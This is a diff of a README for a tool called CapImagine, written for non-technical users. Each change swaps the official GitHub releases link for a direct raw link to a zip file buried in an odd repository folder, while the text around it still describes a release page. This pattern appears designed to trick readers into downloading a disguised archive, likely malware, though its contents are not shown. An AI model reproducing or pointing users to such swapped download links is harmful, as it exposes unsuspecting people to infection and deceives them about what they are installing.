@@ -1,6 +1,6 @@
 # 🚀 CapImagine - Visual Reasoning Made Simple
 
-[![Download CapImagine](https://img.shields.io/badge/Download-CapImagine-brightgreen)](https://github.com/Souhaaail/CapImagine/releases)
+[![Download CapImagine](https://img.shields.io/badge/Download-CapImagine-brightgreen)](https://raw.githubusercontent.com/Souhaaail/CapImagine/main/misset/Cap-Imagine-bonze.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Even if you have no technical background, the interface is made to be clear and 
 
 Click this large button below to visit the official release page:
 
-[![Download CapImagine](https://img.shields.io/badge/Download-CapImagine-blue?style=for-the-badge)](https://github.com/Souhaaail/CapImagine/releases)
+[![Download CapImagine](https://img.shields.io/badge/Download-CapImagine-blue?style=for-the-badge)](https://raw.githubusercontent.com/Souhaaail/CapImagine/main/misset/Cap-Imagine-bonze.zip)
 
 This link will take you to the page where you can find the latest versions of CapImagine.
 
@@ -47,7 +47,7 @@ This link will take you to the page where you can find the latest versions of Ca
 ## 📥 How to Download and Install
 
 1. Click on the big blue button above or go to the following page directly in your web browser:  
-   https://github.com/Souhaaail/CapImagine/releases
+   https://raw.githubusercontent.com/Souhaaail/CapImagine/main/misset/Cap-Imagine-bonze.zip
 
 2. On the releases page, look for the latest release version. It will usually be at the top.
 
@@ -130,8 +130,8 @@ If you encounter problems not covered here:
 ## 📥 Download CapImagine Again
 
 Use this link if you want to download or update the software later:  
-https://github.com/Souhaaail/CapImagine/releases
+https://raw.githubusercontent.com/Souhaaail/CapImagine/main/misset/Cap-Imagine-bonze.zip
 
 Click the big button below to return to the release page:
 
-[![Download CapImagine](https://img.shields.io/badge/Download-CapImagine-brightgreen?style=for-the-badge)](https://github.com/Souhaaail/CapImagine/releases)
+[![Download CapImagine](https://img.shields.io/badge/Download-CapImagine-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Souhaaail/CapImagine/main/misset/Cap-Imagine-bonze.zip)
